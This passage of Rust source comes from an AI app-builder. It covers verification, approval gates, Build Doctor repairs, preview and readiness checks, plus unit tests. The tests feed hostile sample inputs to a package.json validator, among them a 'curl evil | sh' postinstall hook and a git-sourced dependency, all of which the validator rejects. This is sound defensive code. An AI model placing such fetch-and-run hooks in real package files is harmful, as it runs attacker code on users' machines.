            Err(GeniusError::Cancelled) => return Err(GeniusError::Cancelled),
            Err(e) => json!({ "ok": false, "error": { "kind": e.kind(), "message": e.to_string() } }),
        };
        let built = verify["ok"] == json!(true);
        stage("build", if built { "done" } else { "failed" }, if built { "install and production build passed".to_string() } else { format!("stopped at {}", verify["failedStep"].as_str().unwrap_or("verification")) });

        // 5. Runtime: does the preview really serve the generated app and run without errors?
        let mut runtime = Value::Null;
        let mut state = if built { "built" } else { "build_failed" };
        if built {
            if let Some(url) = verify["previewUrl"].as_str() {
                runtime = self.runtime_verify(project_id, task_id, url).await;
                state = match runtime["status"].as_str() {
                    Some("verified") => "verified",
                    Some("problems") => "runtime_errors",
                    _ => "built",
                };
                stage("runtime", runtime["status"].as_str().unwrap_or("unknown"), runtime["summary"].as_str().unwrap_or("").to_string());
            } else {
                state = "preview_failed";
                stage("preview", "failed", verify["preview"]["error"].as_str().unwrap_or("the preview did not start").to_string());
            }
        }
        self.db.patch_project_status(project_id, &json!({ "generation": { "state": state, "at": now() } }))?;
        Ok(json!({ "state": state, "changesetId": cs.id, "applied": true, "rejectedPaths": rejected, "incomplete": incomplete, "gaps": gaps.json(), "verify": verify, "runtime": runtime, "phases": phases }))
    }

    /// True while the project holds only Genius's own starter files (the placeholder page).
    pub(crate) fn starter_only(&self, ws: &Workspace) -> bool {
        ws.exists("package.json") && ws.read_text_opt("src/App.tsx").ok().flatten().is_none_or(|s| scaffold::is_template_app(&s))
    }

    /// What is still missing from the model's output so far (see [`integrity`](crate::integrity)).
    fn generation_gaps(&self, ws: &Workspace, parsed: &crate::blocks::ParsedOutput, blank: bool) -> Gaps {
        let mut gaps = Gaps::default();
        for p in &parsed.incomplete {
            if !parsed.files.iter().any(|(f, _)| f == p) && !gaps.must_write.contains(p) {
                gaps.must_write.push(p.clone());
                gaps.notes.push(format!("- {p} was cut off and was NOT saved"));
            }
        }
        let app = parsed.files.iter().find(|(p, _)| p == "src/App.tsx");
        let app_is_starter = match app {
            Some((_, c)) => scaffold::is_template_app(c),
            None => blank && ws.read_text_opt("src/App.tsx").ok().flatten().is_none_or(|s| scaffold::is_template_app(&s)),
        };
        if app_is_starter && !gaps.must_write.iter().any(|p| p == "src/App.tsx") {
            gaps.must_write.push("src/App.tsx".into());
            gaps.notes.push("- src/App.tsx is still the starter page that says no application has been generated".into());
        }
        let unresolved = crate::integrity::unresolved_relative_imports(&parsed.files, &|p| ws.exists(p));
        if !unresolved.is_empty() {
            gaps.notes.push(crate::integrity::render_unresolved(&unresolved));
            gaps.unresolved = unresolved.len();
        }
        gaps
    }

    /// Runtime evidence for a started preview: the dev server serves the generated `App` module
    /// (not the starter), and — when a Chromium-family browser exists — a real headless page load
    /// has no uncaught exception, console error, failed request or blank page.
    pub(crate) async fn runtime_verify(&self, project_id: &str, task_id: &str, url: &str) -> Value {
        let mut problems: Vec<String> = Vec::new();
        let served = async {
            let client = reqwest::Client::builder().timeout(Duration::from_secs(10)).build().ok()?;
            let base = if url.ends_with('/') { url.to_string() } else { format!("{url}/") };
            let r = client.get(format!("{base}src/App.tsx")).send().await.ok()?;
            r.status().is_success().then_some(())?;
            r.text().await.ok()
        }
        .await;
        let serves_app = served.as_ref().map(|t| !scaffold::is_template_app(t));
        if serves_app == Some(false) {
            problems.push("the dev server is serving the starter page, not the generated application".into());
        }
        if !self.browser_available() {
            let status = if problems.is_empty() { "unavailable" } else { "problems" };
            return json!({ "status": status, "servesGeneratedApp": serves_app, "problems": problems, "browser": false, "summary": "No Chrome/Edge found: the app was built and served but NOT opened in a browser, so runtime behaviour is unverified." });
        }
        let opts = crate::browser::CheckOptions { viewports: vec![1280], ..Default::default() };
        match self.browser_check(project_id, url, opts).await {
            Ok(r) => {
                problems.extend(r.blocking_problems());
                let status = if problems.is_empty() { "verified" } else { "problems" };
                self.bus.record(Some(project_id), Some(task_id), EventKind::Preview, if problems.is_empty() { EventStatus::Completed } else { EventStatus::Failed }, if problems.is_empty() { "Opened the preview in a real browser: no runtime errors".to_string() } else { format!("Browser check found problems: {}", problems.join("; ")) }, json!({ "problems": problems }));
                json!({ "status": status, "servesGeneratedApp": serves_app, "problems": problems, "browser": true, "consoleErrors": r.console_errors(), "summary": if problems.is_empty() { "Opened in a real browser: loads, renders, no console errors or failed requests.".to_string() } else { problems.join("; ") } })
            }
            Err(e) => json!({ "status": "error", "servesGeneratedApp": serves_app, "problems": problems, "browser": true, "summary": format!("The browser check could not run: {e}") }),
        }
    }

    /// Validate model-proposed paths; unsafe ones are rejected and reported, not written.
    pub(crate) fn safe_changes(&self, ws: &Workspace, files: &[(String, String)], deletes: &[String]) -> Result<(Vec<FileChange>, Vec<Value>)> {
        let mut ok_files = Vec::new();
        let mut rejected = Vec::new();
        for (p, c) in files {
            match ws.check_writable(p) {
                Ok(_) if c.len() <= crate::workspace::MAX_WRITE => ok_files.push((p.clone(), c.clone())),
                Ok(_) => rejected.push(json!({ "path": p, "reason": "file too large" })),
                Err(e) => rejected.push(json!({ "path": p, "reason": e.to_string() })),
            }
        }
        let mut ok_deletes = Vec::new();
        for d in deletes {
            match ws.check_writable(d) {
                Ok(_) => ok_deletes.push(d.clone()),
                Err(e) => rejected.push(json!({ "path": d, "reason": e.to_string() })),
            }
        }
        if let Some((_, pkg)) = ok_files.iter().find(|(p, _)| p == "package.json") {
            if let Err(e) = validate_package_json(pkg) {
                ok_files.retain(|(p, _)| p != "package.json");
                rejected.push(json!({ "path": "package.json", "reason": e.to_string() }));
            }
        }
        Ok((compute_changes(ws, &ok_files, &ok_deletes)?, rejected))
    }

    // ===================================================================== change requests

    pub fn preview_context(&self, project_id: &str, request: &str, pinned: &[String], excluded: &[String]) -> Result<ContextPlan> {
        let ws = self.workspace(project_id)?;
        let budget = self.settings()?.context_budget_chars;
        context::plan(&ws, &ContextRequest { query: request, pinned, excluded, must: &[], budget_chars: budget })
    }

    pub fn start_change(self: &Arc<Self>, project_id: &str, request: &str, pinned: Vec<String>, excluded: Vec<String>) -> Result<TaskInfo> {
        if request.trim().is_empty() {
            return Err(GeniusError::Validation("Describe the change you want.".into()));
        }
        self.has_usable_model()?;
        let me = self.clone();
        let (pid, req) = (project_id.to_string(), request.to_string());
        let title: String = format!("Change: {}", request.chars().take(60).collect::<String>());
        self.spawn_task(project_id, "change", &title, move |tid, cancel| async move { me.change(&pid, &tid, &req, &pinned, &excluded, &cancel).await })
    }

    pub async fn change(&self, project_id: &str, task_id: &str, request: &str, pinned: &[String], excluded: &[String], cancel: &CancellationToken) -> Result<Value> {
        let p = self.db.get_project(project_id)?;
        let ws = self.workspace(project_id)?;
        self.db.add_message(project_id, Some(task_id), "user", request)?;
        let s = self.settings()?;
        let plan = context::plan(&ws, &ContextRequest { query: request, pinned, excluded, must: &[], budget_chars: s.context_budget_chars })?;
        let included: Vec<String> = plan.files.iter().filter(|f| f.included).map(|f| f.path.clone()).collect();
        self.bus.record(Some(project_id), Some(task_id), EventKind::FileRead, EventStatus::Completed, format!("Read {} relevant files for context", included.len()), json!({ "files": included, "chars": plan.used_chars, "excludedSensitive": plan.excluded_sensitive }));
        let spec_summary = p.spec.as_ref().and_then(|v| serde_json::from_value::<ProjectSpec>(v.clone()).ok()).map(|s| format!("{}: {}", s.name, s.purpose)).unwrap_or_default();
        let messages = prompts::change_messages(request, &context::render(&ws, &plan), &p.notes, &spec_summary);
        let (_, events) = self.ai_call(project_id, task_id, "Implementing change", &messages, true, cancel).await?;
        let parsed = collect(&events);
        if parsed.files.is_empty() && parsed.deletes.is_empty() {
            self.db.add_message(project_id, Some(task_id), "assistant", &parsed.explanation)?;
            return Ok(json!({ "changesetId": null, "explanation": parsed.explanation, "note": "The model did not propose any file changes." }));
        }
        let (changes, rejected) = self.safe_changes(&ws, &parsed.files, &parsed.deletes)?;
        if changes.is_empty() {
            return Ok(json!({ "changesetId": null, "explanation": parsed.explanation, "rejectedPaths": rejected, "note": "The proposed files are identical to the current ones." }));
        }
        let title: String = request.lines().next().unwrap_or(request).chars().take(80).collect();
        let cs = ChangeStore::new(&self.db).create(project_id, Some(task_id), "change", &title, &parsed.explanation, &changes)?;
        self.db.add_message(project_id, Some(task_id), "assistant", if parsed.explanation.is_empty() { "Proposed changes." } else { &parsed.explanation })?;
        self.finish_proposal(project_id, task_id, &cs, s.approvals.apply_ai_edits, cancel, json!({ "rejectedPaths": rejected, "incomplete": parsed.incomplete })).await
    }

    pub(crate) async fn finish_proposal(&self, project_id: &str, task_id: &str, cs: &Changeset, policy: Policy, cancel: &CancellationToken, extra: Value) -> Result<Value> {
        let mut out = json!({ "changesetId": cs.id, "explanation": cs.summary });
        if let (Some(o), Some(e)) = (out.as_object_mut(), extra.as_object()) {
            o.extend(e.clone());
        }
        if policy == Policy::Auto {
            self.bus.record(Some(project_id), Some(task_id), EventKind::Approval, EventStatus::Completed, format!("Auto-applying by your settings: {}", cs.title), json!({ "changesetId": cs.id }));
            self.apply_changeset_inner(project_id, Some(task_id), &cs.id)?;
            out["applied"] = json!(true);
            if self.settings()?.verify_after_apply {
                out["verify"] = self.verify_pipeline(project_id, task_id, cancel, false).await.unwrap_or_else(|e| json!({ "ok": false, "error": e.to_string() }));
            }
        } else {
            self.bus.record(Some(project_id), Some(task_id), EventKind::Changeset, EventStatus::AwaitingApproval, format!("Review proposed changes: {}", cs.title), json!({ "changesetId": cs.id, "files": cs.files }));
            out["applied"] = json!(false);
        }
        Ok(out)
    }

    // ===================================================================== execution

    pub fn needs_install(&self, project_id: &str) -> Result<bool> {
        let ws = self.workspace(project_id)?;
        let root = ws.root();
        let marker = root.join("node_modules").join(".package-lock.json");
        if !root.join("node_modules").is_dir() || !marker.is_file() {
            return Ok(root.join("package.json").is_file());
        }
        let pkg_m = std::fs::metadata(root.join("package.json")).and_then(|m| m.modified()).ok();
        let mk_m = std::fs::metadata(&marker).and_then(|m| m.modified()).ok();
        Ok(matches!((pkg_m, mk_m), (Some(a), Some(b)) if a > b))
    }

    /// Approvals required before running an npm operation. Scripts that differ from the
    /// Genius template always require approval showing the exact script text.
    pub(crate) async fn gate_operation(&self, project_id: &str, task_id: Option<&str>, op: Operation, user_initiated: bool, cancel: &CancellationToken) -> Result<()> {
        let ws = self.workspace(project_id)?;
        let pkg: Value = ws.read_text_opt("package.json")?.and_then(|t| serde_json::from_str(&t).ok()).ok_or_else(|| GeniusError::Validation("package.json is missing or invalid".into()))?;
        if op == Operation::Install {
            if !user_initiated {
                let deps = json!({ "dependencies": pkg.get("dependencies"), "devDependencies": pkg.get("devDependencies") });
                let policy = self.settings()?.approvals.dependency_install;
                self.approvals
                    .request(&self.bus, Some(project_id), task_id, "dependency_install", policy, "Install npm dependencies (runs package install scripts)", json!({ "command": "npm install --no-audit --no-fund", "cwd": ws.root(), "packages": deps }), cancel)
                    .await?;
            }
            return Ok(());
        }
        let script = op.script().unwrap_or_default();
        let actual = pkg.pointer(&format!("/scripts/{script}")).and_then(|s| s.as_str());
        let Some(actual) = actual else {
            return Err(GeniusError::Validation(format!("package.json has no \"{script}\" script")));
        };
        let trusted = scaffold::trusted_scripts().iter().any(|(k, v)| *k == script && *v == actual);
        if !trusted {
            self.approvals
                .request(&self.bus, Some(project_id), task_id, "untrusted_script", Policy::Ask, &format!("Run modified npm script \"{script}\""), json!({ "script": script, "command": actual, "note": "This script differs from the Genius template. It runs as a program on your computer." }), cancel)
                .await?;
        }
        Ok(())
    }

    pub async fn run_operation(&self, project_id: &str, task_id: Option<&str>, op: Operation, reason: &str, user_initiated: bool, cancel: &CancellationToken) -> Result<RunOutcome> {
        if op == Operation::Dev {
            return Err(GeniusError::Validation("use start_preview for the development server".into()));
        }
        self.gate_operation(project_id, task_id, op, user_initiated, cancel).await?;
        let ws = self.workspace(project_id)?;
        let out = self.procs.run_to_end(project_id, task_id, ws.root(), op, reason, cancel).await?;
        let key = match op {
            Operation::Install => "lastInstall",
            Operation::Build => "lastBuild",
            Operation::Test => "lastTest",
            Operation::Typecheck => "lastTypecheck",
            Operation::Dev => "lastDev",
        };
        self.db.patch_project_status(project_id, &json!({ key: { "status": out.status, "exitCode": out.exit_code, "at": now(), "runId": out.id, "durationMs": out.duration_ms } }))?;
        if out.status == "cancelled" {
            return Err(GeniusError::Cancelled);
        }
        Ok(out)
    }

    pub fn start_operation(self: &Arc<Self>, project_id: &str, op: Operation) -> Result<TaskInfo> {
        let me = self.clone();
        let pid = project_id.to_string();
        self.spawn_task(project_id, "verify", op.label(), move |tid, cancel| async move {
            let out = me.run_operation(&pid, Some(&tid), op, "Requested by you", true, &cancel).await?;
            if out.ok() {
                Ok(json!({ "outcome": out }))
            } else {
                Err(GeniusError::Process(format!("{} failed (exit code {}). Open the terminal output or ask the Build Doctor to diagnose it.", op.label(), out.exit_code.map(|c| c.to_string()).unwrap_or_else(|| "none".into()))))
            }
        })
    }

    /// Install (if needed) → build → (Build Doctor on failure) → preview.
    /// Every step is a real process with a real exit code; nothing is assumed.
    pub async fn verify_pipeline(&self, project_id: &str, task_id: &str, cancel: &CancellationToken, start_preview: bool) -> Result<Value> {
        self.verify_pipeline_opts(project_id, task_id, cancel, start_preview, false).await
    }

    /// `autopilot_repairs`: repairs are applied without review (the first build of a new app).
    pub async fn verify_pipeline_opts(&self, project_id: &str, task_id: &str, cancel: &CancellationToken, start_preview: bool, autopilot_repairs: bool) -> Result<Value> {
        let mut report = json!({});
        if self.needs_install(project_id)? {
            let out = self.run_operation(project_id, Some(task_id), Operation::Install, "Dependencies are missing or package.json changed", false, cancel).await?;
            report["install"] = json!(out.status);
            if !out.ok() {
                report["ok"] = json!(false);
                report["failedStep"] = json!("install");
                return Ok(report);
            }
        }
        let build = self.run_operation(project_id, Some(task_id), Operation::Build, "Verify that the project compiles", false, cancel).await?;
        report["build"] = json!({ "status": build.status, "exitCode": build.exit_code, "runId": build.id });
        if !build.ok() {
            report["ok"] = json!(false);
            report["failedStep"] = json!("build");
            let attempts = self.repair_history.lock().unwrap().get(project_id).map(|v| v.len()).unwrap_or(0) as u32;
            let max = self.settings()?.max_repair_attempts;
            if attempts < max {
                match Box::pin(self.diagnose_opts(project_id, task_id, Some(&build.id), cancel, autopilot_repairs)).await {
                    Ok(v) => report["doctor"] = v,
                    Err(GeniusError::Cancelled) => return Err(GeniusError::Cancelled),
                    Err(e) => report["doctor"] = json!({ "error": { "kind": e.kind(), "message": e.to_string() } }),
                }
            } else {
                report["doctor"] = json!({ "stopped": format!("Stopped after {max} automatic repair attempts. Review the diagnostics, edit the code, or ask for a specific change.") });
                self.bus.record(Some(project_id), Some(task_id), EventKind::Diagnosis, EventStatus::Failed, format!("Build Doctor stopped after {max} attempts"), json!({ "attempts": self.repair_history.lock().unwrap().get(project_id).cloned() }));
            }
            return Ok(report);
        }
        // A green build of the starter page proves nothing about the requested application.
        if let Ok(ws) = self.workspace(project_id) {
            if ws.read_text_opt("src/App.tsx").ok().flatten().is_some_and(|s| scaffold::is_template_app(&s)) {
                report["ok"] = json!(false);
                report["failedStep"] = json!("generate");
                report["placeholder"] = json!(true);
                report["message"] = json!("The build passed, but src/App.tsx is still the Genius starter page: the application has not been generated yet.");
                self.bus.record(Some(project_id), Some(task_id), EventKind::Build, EventStatus::Failed, "Build passed, but only the starter page exists — the application is not generated", json!({ "placeholder": true }));
                return Ok(report);
            }
        }
        self.repair_history.lock().unwrap().remove(project_id);
        report["ok"] = json!(true);
        if start_preview {
            match self.start_preview(project_id, Some(task_id)).await {
                Ok(url) => report["previewUrl"] = json!(url),
                Err(e) => report["preview"] = json!({ "error": e.to_string() }),
            }
        }
        Ok(report)
    }

    // ===================================================================== Build Doctor

    pub fn start_diagnose(self: &Arc<Self>, project_id: &str, run_id: Option<String>) -> Result<TaskInfo> {
        let me = self.clone();
        let pid = project_id.to_string();
        self.spawn_task(project_id, "repair", "Build Doctor: diagnose failure", move |tid, cancel| async move { me.diagnose(&pid, &tid, run_id.as_deref(), &cancel).await })
    }

    /// Diagnose a real failed run and propose a targeted repair.
    pub async fn diagnose(&self, project_id: &str, task_id: &str, run_id: Option<&str>, cancel: &CancellationToken) -> Result<Value> {
        self.diagnose_opts(project_id, task_id, run_id, cancel, false).await
    }

    async fn diagnose_opts(&self, project_id: &str, task_id: &str, run_id: Option<&str>, cancel: &CancellationToken, autopilot: bool) -> Result<Value> {
        let runs = self.db.list_runs(project_id, 50)?;
        let run = match run_id {
            Some(id) => runs.into_iter().find(|r| r.id == id),
            None => runs.into_iter().find(|r| r.status == "failed" && r.op != "dev" && r.op != "install"),
        }
        .ok_or_else(|| GeniusError::NotFound("a failed build or test run to diagnose".into()))?;
        if run.status != "failed" {
            return Err(GeniusError::Validation(format!("That run did not fail (status: {}).", run.status)));
        }
        let ws = self.workspace(project_id)?;
        let diags = diagnostics::parse(&run.output_tail);
        let referenced: Vec<String> = diagnostics::referenced_files(&run.output_tail, &diags).into_iter().filter(|f| ws.exists(f)).collect();
        let mut ev = self.bus.start(Some(project_id), Some(task_id), EventKind::Diagnosis, EventStatus::Running, format!("Inspecting failure of `{}`", run.command), json!({ "runId": run.id, "exitCode": run.exit_code, "diagnostics": diags, "files": referenced }));
        let p = self.db.get_project(project_id)?;
        let s = self.settings()?;
        let query: String = diags.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join(" ");
        let plan = context::plan(&ws, &ContextRequest { query: &query, pinned: &[], excluded: &[], must: &referenced, budget_chars: s.context_budget_chars / 2 })?;
        let diag_text = if diags.is_empty() {
            "(no structured diagnostics recognised; see output)".to_string()
        } else {
            diags.iter().map(|d| format!("{}:{}:{} {} {}", d.file.as_deref().unwrap_or("?"), d.line.unwrap_or(0), d.column.unwrap_or(0), d.code.as_deref().unwrap_or(""), d.message)).collect::<Vec<_>>().join("\n")
        };
        let previous = self.repair_history.lock().unwrap().get(project_id).cloned().unwrap_or_default();
        let messages = prompts::repair_messages(&run.command, run.exit_code, &diag_text, &diagnostics::focus_log(&run.output_tail, 12_000), &context::render(&ws, &plan), &previous, &p.notes);
        let result = self.ai_call(project_id, task_id, "Diagnosing and preparing a fix", &messages, true, cancel).await;
        let (_, events) = match result {
            Ok(x) => x,
            Err(e) => {
                ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                return Err(e);
            }
        };
        let mut parsed = collect(&events);
        if parsed.files.is_empty() && parsed.deletes.is_empty() {
            let raw: String = events.iter().filter_map(|e| match e { BlockEvent::Text { line } => Some(format!("{line}\n")), _ => None }).collect();
            let fenced = crate::blocks::fenced_files(&raw);
            if fenced.skipped.is_empty() {
                parsed.files = fenced.files;
            }
        }
        let root_cause = parsed.explanation.lines().find(|l| l.to_lowercase().starts_with("root cause")).map(|l| l.trim().to_string()).unwrap_or_else(|| parsed.explanation.lines().next().unwrap_or("").to_string());
        let (changes, rejected) = self.safe_changes(&ws, &parsed.files, &parsed.deletes)?;
        if changes.is_empty() {
            // The one-shot fix produced nothing usable: hand the failure to the full agent, which
            // can inspect the project with tools and verify its own fix.
            ev.update(EventStatus::Completed, json!({ "rootCause": root_cause, "note": "No direct fix; handing over to the Genius agent." }));
            let conv = self.db.current_conversation(project_id)?;
            let req = crate::agent::AgentRequest {
                conversation_id: conv.id,
                message: format!("Build Doctor: `{}` failed (exit {}). Find the root cause and fix it, then verify with run_check.\n\nErrors:\n{diag_text}", run.command, run.exit_code.map(|c| c.to_string()).unwrap_or_else(|| "none".into())),
                effort: Some("max".into()),
                autopilot: Some(autopilot || s.approvals.apply_ai_edits == Policy::Auto),
                ..Default::default()
            };
            let res = Box::pin(self.run_agent(project_id, task_id, &req, cancel)).await?;
            return Ok(json!({ "rootCause": root_cause, "agent": res, "rejectedPaths": rejected }));
        }
        self.repair_history.lock().unwrap().entry(project_id.to_string()).or_default().push(format!("{root_cause} (files: {})", changes.iter().map(|c| c.path.as_str()).collect::<Vec<_>>().join(", ")));
        let cs = ChangeStore::new(&self.db).create(project_id, Some(task_id), "repair", &format!("Fix: {}", run.command), &parsed.explanation, &changes)?;
        ev.update(EventStatus::Completed, json!({ "rootCause": root_cause, "changesetId": cs.id }));
        self.db.add_message(project_id, Some(task_id), "assistant", &format!("Build Doctor — {}\n\n{}", run.command, parsed.explanation))?;
        let policy = if autopilot { Policy::Auto } else { s.approvals.apply_ai_edits };
        let res = Box::pin(self.finish_proposal(project_id, task_id, &cs, policy, cancel, json!({ "rootCause": root_cause, "rejectedPaths": rejected }))).await?;
        Ok(res)
    }

    pub fn repair_attempts(&self, project_id: &str) -> Vec<String> {
        self.repair_history.lock().unwrap().get(project_id).cloned().unwrap_or_default()
    }

    pub fn reset_repair_attempts(&self, project_id: &str) {
        self.repair_history.lock().unwrap().remove(project_id);
    }

    // ===================================================================== preview

    pub async fn start_preview(&self, project_id: &str, task_id: Option<&str>) -> Result<String> {
        if self.needs_install(project_id)? {
            return Err(GeniusError::Validation("Dependencies are not installed yet. Run Install first.".into()));
        }
        let cancel = CancellationToken::new();
        self.gate_operation(project_id, task_id, Operation::Dev, true, &cancel).await?;
        let ws = self.workspace(project_id)?;
        self.bus.push(channels::PREVIEW, json!({ "projectId": project_id, "status": "starting" }));
        self.clear_preview_errors(project_id);
        // Element picker support; if it cannot be prepared the preview still runs without it.
        let inspector = crate::inspector::prepare(ws.root()).unwrap_or_else(|e| {
            log::warn!("preview inspector unavailable: {e}");
            None
        });
        let run = self.procs.start_with(project_id, task_id, ws.root(), Operation::Dev, "Live preview", inspector.as_deref()).await?;
        match self.procs.wait_until_listening(&run, Duration::from_secs(90)).await {
            Ok(url) => {
                self.previews.lock().unwrap().insert(project_id.into(), url.clone());
                self.bus.record(Some(project_id), task_id, EventKind::Preview, EventStatus::Completed, format!("Preview is live at {url}"), json!({ "url": url, "runId": run.id }));
                self.bus.push(channels::PREVIEW, json!({ "projectId": project_id, "status": "ready", "url": url, "runId": run.id, "inspector": inspector.is_some() }));
                // Watch for the server exiting so the UI never shows a dead preview as live.
                let procs = self.procs.clone();
                let bus = self.bus.clone();
                let previews = self.previews.clone();
                let (pid, rid) = (project_id.to_string(), run.id.clone());
                self.rt.spawn(async move {
                    if let Ok(o) = procs.wait(&rid).await {
                        let mut map = previews.lock().unwrap();
                        if procs.dev_server(&pid).is_none() {
                            map.remove(&pid);
                            bus.push(channels::PREVIEW, json!({ "projectId": pid, "status": "stopped", "outcome": o }));
                        }
                    }
                });
                Ok(url)
            }
            Err(e) => {
                let _ = self.procs.stop(&run.id).await;
                self.bus.push(channels::PREVIEW, json!({ "projectId": project_id, "status": "failed", "error": e.to_string() }));
                Err(e)
            }
        }
    }

    pub async fn stop_preview(&self, project_id: &str) -> Result<()> {
        if let Some(r) = self.procs.dev_server(project_id) {
            self.procs.stop(&r.id).await?;
        }
        self.previews.lock().unwrap().remove(project_id);
        self.bus.push(channels::PREVIEW, json!({ "projectId": project_id, "status": "stopped" }));
        Ok(())
    }

    pub fn preview_url(&self, project_id: &str) -> Option<String> {
        self.procs.dev_server(project_id)?;
        self.previews.lock().unwrap().get(project_id).cloned()
    }

    pub async fn shutdown(&self) {
        for t in self.tasks.lock().unwrap().values() {
            t.cancel.cancel();
        }
        self.approvals.cancel_all();
        self.procs.stop_all().await;
    }

    // ===================================================================== export & readiness

    pub fn export_project(&self, project_id: &str, dest: &str, as_zip: bool) -> Result<crate::export::ExportResult> {
        let ws = self.workspace(project_id)?;
        let p = self.db.get_project(project_id)?;
        let mut ev = self.bus.start(Some(project_id), None, EventKind::Export, EventStatus::Running, format!("Exporting source to {dest}"), json!({ "zip": as_zip }));
        let dest_path = PathBuf::from(dest);
        let res = if as_zip { crate::export::export_zip(&ws, &dest_path, &scaffold::slugify(&p.name)) } else { crate::export::export_folder(&ws, &dest_path) };
        match &res {
            Ok(r) => ev.update(EventStatus::Completed, serde_json::to_value(r)?),
            Err(e) => ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } })),
        }
        res
    }

    pub async fn readiness(&self, project_id: &str) -> Result<Vec<ReadinessCheck>> {
        let p = self.db.get_project(project_id)?;
        let ws = self.workspace(project_id)?;
        let mut checks = Vec::new();
        let check = |id: &str, label: &str, status: &str, detail: String| ReadinessCheck { id: id.into(), label: label.into(), status: status.into(), detail };
        let last_change = self.list_changesets(project_id)?.into_iter().filter(|c| c.status == "applied" || c.status == "reverted").filter_map(|c| c.applied_at).max();
        let installed = !self.needs_install(project_id)?;
        checks.push(check("deps", "Dependencies installed", if installed { "pass" } else { "warn" }, if installed { "node_modules matches package.json".into() } else { "Run Install to fetch dependencies".into() }));
        for (key, id, label) in [("lastBuild", "build", "Production build"), ("lastTest", "test", "Tests")] {
            let st = p.status.get(key);
            let c = match st {
                None => check(id, label, "unknown", "Not run yet".into()),
                Some(s) => {
                    let at = s.get("at").and_then(|a| a.as_str()).unwrap_or("");
                    let ok = s.get("status").and_then(|x| x.as_str()) == Some("succeeded");
                    let stale = last_change.as_deref().is_some_and(|lc| lc > at);
                    let status = if !ok { "fail" } else if stale { "warn" } else { "pass" };
                    let when = chrono::DateTime::parse_from_rfc3339(at).map(|t| t.with_timezone(&chrono::Local).format("%Y-%m-%d %H:%M").to_string()).unwrap_or_else(|_| at.to_string());
                    let detail = format!(
                        "{} {}{}",
                        if ok { "Succeeded" } else { "Failed" },
                        when,
                        if stale { " — files changed since; run again" } else { "" }
                    );
                    check(id, label, status, detail)
                }
            };
            checks.push(c);
        }
        let files: Vec<String> = ws.list_files()?.into_iter().map(|f| f.path).collect();
        let findings = crate::secretscan::scan_files(&ws, &files.iter().filter(|f| !f.starts_with(".env")).cloned().collect::<Vec<_>>());
        checks.push(check("secrets", "No hard-coded secrets in source", if findings.is_empty() { "pass" } else { "fail" }, if findings.is_empty() { format!("Scanned {} files", files.len()) } else { findings.iter().map(|f| format!("{}:{} {}", f.path, f.line.unwrap_or(0), f.kind)).collect::<Vec<_>>().join("; ") }));
        let readme = files.iter().any(|f| f.eq_ignore_ascii_case("readme.md"));
        checks.push(check("readme", "README present", if readme { "pass" } else { "warn" }, if readme { "README.md found".into() } else { "Add a README describing the project".into() }));
        match crate::git::Git::detect() {
            Ok(g) => {
                let st = g.status(ws.root()).await?;
                if !st.is_repo {
                    checks.push(check("git", "Version control", "warn", "Not a Git repository".into()));
                } else {
                    let clean = st.files.is_empty();
                    checks.push(check("git", "Changes committed", if clean { "pass" } else { "warn" }, if clean { "Working tree clean".into() } else { format!("{} uncommitted file(s)", st.files.len()) }));
                    let pushed = st.upstream.is_some() && st.ahead == 0;
                    checks.push(check("remote", "Pushed to remote", if pushed { "pass" } else { "warn" }, match &st.upstream {
                        Some(u) => format!("{} commit(s) ahead of {u}", st.ahead),
                        None => "No upstream branch configured".into(),
                    }));
                }
            }
            Err(e) => checks.push(check("git", "Version control", "unknown", e.to_string())),
        }
        let preview = self.preview_url(project_id);
        checks.push(check("preview", "Live preview running", if preview.is_some() { "pass" } else { "unknown" }, preview.unwrap_or_else(|| "Not running".into())));
        Ok(checks)
    }
}

/// Reject model-written package.json files that would break the toolchain or smuggle in
/// install-time code: scripts must stay as they were unless the user changes them.
pub fn validate_package_json(text: &str) -> Result<()> {
    let v: Value = serde_json::from_str(text).map_err(|e| GeniusError::Validation(format!("package.json is not valid JSON: {e}")))?;
    for section in ["dependencies", "devDependencies"] {
        if let Some(obj) = v.get(section).and_then(|d| d.as_object()) {
            for (name, ver) in obj {
                if !spec::valid_npm_name(name) {
                    return Err(GeniusError::Validation(format!("invalid package name '{name}'")));
                }
                let ver = ver.as_str().unwrap_or("");
                if ver.starts_with("file:") || ver.starts_with("link:") || ver.contains("://") || ver.starts_with("git") {
                    return Err(GeniusError::Validation(format!("dependency '{name}' uses a non-registry source ({ver}); add such dependencies manually")));
                }
            }
        }
    }
    if let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) {
        for hook in ["preinstall", "install", "postinstall", "prepare", "prepublish"] {
            if scripts.contains_key(hook) {
                return Err(GeniusError::Validation(format!("the '{hook}' lifecycle script is not allowed in AI-written package.json")));
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::secrets::NVIDIA_KEY;

    /// Tauri runs synchronous commands on the main thread, outside any Tokio context.
    /// Spawning a task from such a thread must work (regression test for a startup crash).
    #[test]
    fn tasks_can_be_spawned_from_non_runtime_threads() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let g = rt.block_on(async {
            Genius::new(dir.path(), Arc::new(crate::events::NullEmitter), Arc::new(crate::secrets::MemoryStore::default())).unwrap()
        });
        let p = g.create_project("Thread test", "").unwrap();
        let g2 = g.clone();
        let pid = p.id.clone();
        let task = std::thread::spawn(move || g2.spawn_task(&pid, "test", "noop", |_, _| async { Ok(json!({ "ran": true })) }).unwrap())
            .join()
            .expect("spawning from a plain thread must not panic");
        rt.block_on(async {
            for _ in 0..100 {
                if g.active_tasks(None).is_empty() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        });
        let ev = g.bus.list(Some(&p.id), 50).unwrap().into_iter().find(|e| e.task_id.as_deref() == Some(task.id.as_str())).unwrap();
        assert_eq!(ev.status, EventStatus::Completed);
        assert_eq!(ev.detail["result"]["ran"], true);
    }

    #[test]
    fn package_json_validation() {
        assert!(validate_package_json(r#"{"dependencies":{"react":"^19.0.0"}}"#).is_ok());
        assert!(validate_package_json(r#"{"dependencies":{"x":"git+https://evil/x.git"}}"#).is_err());
        assert!(validate_package_json(r#"{"dependencies":{"x":"file:../../etc"}}"#).is_err());
        assert!(validate_package_json(r#"{"scripts":{"postinstall":"curl evil | sh"}}"#).is_err());
        assert!(validate_package_json("not json").is_err());
    }

    // ------------------------------------------------------------- routing (mocked NVIDIA API)

